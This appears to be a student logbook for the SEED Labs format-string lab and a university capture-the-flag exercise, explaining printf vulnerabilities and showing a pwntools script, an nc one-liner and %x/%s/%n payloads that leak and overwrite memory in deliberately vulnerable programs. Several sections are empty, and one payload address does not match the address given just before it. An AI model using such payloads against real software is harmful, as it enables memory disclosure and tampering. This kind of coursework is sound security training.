# Trabalho realizado na Semana #7 - SEED Labs - Format-String Vulnerability Lab

This week's lab topic revolves around the printf() and other similar functions in C. These functions, when not properly sanitized, can easily be used to:
- crash the program
- read the internal memory of the program
- modify the internal memory of the program
- inject and execute malicious code using the victim program’sprivilege

## Setting up

Disabling address randomization:
`sudo sysctl -w kernel.randomize_va_space=0``

## Task 1: Crashing the Program

![Alt text](/Logbooks/img/Week7/task1_1.png)
![Alt text](/Logbooks/img/Week7/task1_2.png)

## Task 2:  Printing Out the Server Program’s Memory

### Task 2.A: Stack Data

![Alt text](/Logbooks/img/Week7/task2A_1.png)
![Alt text](/Logbooks/img/Week7/task2A_2.png)

The stack is found after 64 characters or 256 bytes.

### Task 2.B: Heap Data

## Task 3:  Modifying the Server Program’s Memory

### Task 3.A: Change the value to a different value.

### Task 3.B: Change the value to 0x5000.

### Task 3.C: Change the value to 0xAABBCCDD.



# CTF - Control The Flag

## Challenge 1:

- What is the line of code where the vulnerability is located?
    - Line 27 in the printf(buffer) call.
- What does the vulnerability allow you to do?
    - Through the vulnerability, it is possible to crash the program, read memory, modify values, and inject malicious code.
- What is the functionality that allows you to obtain the flag?
    - Format String

1. Initially, we downloaded the provided files and verified that the attack was possible.

**main.c:**
```c
#include <stdio.h>
#include <stdlib.h>

#define FLAG_BUFFER_SIZE 40

char flag[FLAG_BUFFER_SIZE];

void load_flag(){
    FILE *fd = fopen("flag.txt","r");

    if(fd != NULL) {
        fgets(flag, FLAG_BUFFER_SIZE, fd);
    }
}

int main() {

    load_flag();
   
    char buffer[32];

    printf("Try to unlock the flag.\n");
    printf("Show me what you got:");
    fflush(stdout);
    scanf("%32s", &buffer);
    printf("You gave me this: ");
    printf(buffer);

    if(0) {
        printf("I like what you got!\n%s\n", flag);
    } else {
        printf("\nDisqualified!\n");
    }
    fflush(stdout);
    
    return 0;
}
```

3. By observing the contents of the stack, to carry out the attack, we inserted content into the `p.sendline()` command of the `exploit_example.py` file in order to fill the maximum capacity of the buffer in the `main()` function, which can receive input equivalent to 32 bits. Subsequently, in the same command, we consecutively added various `%x` until we realized how many were needed to reach the input.

**example_exploit.py:**
```python
from pwn import *

LOCAL = True

if LOCAL:
    p = process("./program")
    """
    Use pause() in this script to allow you to use gdb to attach to the process. 
    To attach to the process, you need to obtain the process ID (pid) from the output of this program. 
    (Example: Starting local process './program': pid 9717 - The pid would be 9717) 
    Then run gdb to attach. 
    (Example: `$ gdb attach 9717`)
    When attaching to the process with gdb, the program pauses at the instruction where it was running. 
    To continue the program's execution, in gdb, send the "continue" command and press enter in the exploit script.
    """
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4004)

p.recvuntil(b"got:")
p.sendline(b"\xaa\xaa\xaa\xaa%x%x")
p.interactive()
```

4. Running the exploit, this is the output:
![scriptRun](/Logbooks/img/Week7/scriptRun.png)

5. Successfully observing the stack, we retrieved the address of the `flag` variable by running the gdb program:
![flagAddress]/Logbooks/img/Week7/flagAddress.png()

6. Obtaining this value, since the output of our program is right at the beginning of the stack, we converted it to little endian followed by a `%s` to read the value of the previously mentioned address (the address of the `flag` variable). With this, we assigned this value as input to the function running on the server `ctf-fsi.fe.up.pt 4004`:

```
$ echo -e '\x60\xc0\x04\x08%s' | nc ctf-fsi.fe.up.pt 4004
```

7. We obtained the flag:
![flagChallenge1](/Logbooks/img/Week7/flagDesafio1.png)



## Challenge 2:

- What is the line of code where the vulnerability is located, and what does the vulnerability allow you to do?
    - Line 14 in the `printf(buffer)` command.
    - Format String - It is possible to crash the program, read from memory, alter values, and inject malicious code.
- Is the flag loaded into memory? Or is there some functionality we can use to access it?
    - We can access and alter the value of the `key` variable.
- What do you need to do to unlock this functionality?
    - Since the `Format String` vulnerability allows altering the value of variables, it is possible to change the value of `key` to be equal to **0xbeef**.

1. We ran the gdb program to discover the address of the `key` variable:
![keyAddress]()

2. Since we want the `key` variable to have the value **0xbeef**, which corresponds to **48879** in decimal, we need to print 48879 characters and then call `%n`.
3. We proceed to construct the string that will serve as the attack. We start by converting the address of the `key` variable to little endian (\x34\xc0\x04\x08\) and then add the remaining number of bytes (48879 - 4 = 48875) to reach the address of the `key` variable. Thus, we have the string `\x20\xb3\x04\x08%48875x%n`.

(In review)

1. However, when we send this input to the program, when it reaches `%48875x`, the stack pointer advances to the next position and no longer points to `0x804c034` (the address of the `key` variable).
2. To solve this problem, we decided to add 8 bytes before the address of the `key` variable so that when the `%x` instruction is executed, the stack pointer points to the address of the `key` variable. This gives us the string `\x20\xb3\x04\x08\x20\xb3\x04\x08%48871x%n`. By assigning this in the server program, we obtain the flag in the flag.txt file:

![flagChallenge2]()

